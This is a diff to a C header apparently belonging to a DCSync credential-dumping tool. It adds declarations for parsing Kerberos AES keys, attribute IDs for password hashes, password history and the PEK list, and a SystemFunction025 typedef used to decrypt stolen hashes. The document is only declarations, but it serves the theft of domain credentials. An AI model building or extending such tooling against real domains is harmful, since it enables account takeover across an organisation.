@@ -56,7 +56,12 @@ typedef struct {
 
 // typedef void *DRS_HANDLE;
 
-void DCSync(char *DN, char *objGuid);
+void DCSync(LPCWSTR samAccountName);
+void BytesToHex(const BYTE *bytes, DWORD len, char *output);
+DWORD HexToBinary(const BYTE *hexData, DWORD hexLen, BYTE *binaryOut);
+BOOL ParseKerberosKeys(const BYTE *propertyData, DWORD propertyLen,
+                       const char *samAccountName, const char *dcHostname,
+                       DWORD accountType, char *aes256Out, char *aes128Out);
 
 // DRS Flags
 #define DRS_INIT_SYNC 0x00000001
@@ -71,3 +76,25 @@ void DCSync(char *DN, char *objGuid);
 // DRS Extended Operations
 #define EXOP_REPL_OBJ 6
 #define EXOP_REPL_SECRETS 3
+
+// Attribute Types
+#define ATT_UNICODE_PWD 0x9005A
+#define ATT_NT_PWD_HISTORY 0x9005E
+#define ATT_LM_PWD_HISTORY 0x900A0
+#define ATT_SUPPLEMENTAL_CREDS 0x9007D
+#define ATT_SAM_ACCOUNT_NAME 0x900DD
+#define ATT_SAM_ACCOUNT_TYPE 0x9012E
+#define ATT_USER_PRINCIPAL_NAME 0x90290
+#define ATT_OBJECT_SID 0x90092
+#define ATT_PEK_LIST 0x90481
+
+// sAMAccountType values for account type detection
+#define SAM_USER_OBJECT 0x30000000     // Normal user account
+#define SAM_MACHINE_ACCOUNT 0x30000001 // Computer/workstation account
+#define SAM_TRUST_ACCOUNT 0x30000002   // Trust account
+//
+//
+// non exported functions for loading from memory
+typedef NTSTATUS(WINAPI *SystemFunction025_t)(const BYTE *KeyMaterial,
+                                              const ULONG *KeySeed,
+                                              BYTE *Output);
